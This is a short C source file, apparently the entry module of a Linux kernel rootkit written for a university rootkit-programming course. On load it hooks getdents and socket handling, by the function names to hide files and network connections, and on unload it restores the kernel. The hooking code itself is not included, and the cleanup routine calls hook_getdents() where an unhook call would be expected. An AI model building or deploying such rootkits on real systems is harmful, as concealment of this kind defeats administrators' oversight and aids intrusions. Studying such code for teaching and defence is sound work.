/*
 * Rootkit for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <linux/kernel.h>

#include "getdents.h"
#include "hide_socket.h"
#include "include.h"

/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and then does its magic.
 */
int init_module (void)
{	
	ROOTKIT_DEBUG("Loading rootkit...\n");

	hook_getdents();	
	hook_sockets();
	
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the kernel to its
 * original form.
 */
void cleanup_module (void)
{
	ROOTKIT_DEBUG("Starting unloading procedure...\n");
	hook_getdents();
	unhook_sockets();
	
	/* Finally, log the unloading */
	ROOTKIT_DEBUG("Unloading rootkit... bye!\n");
}
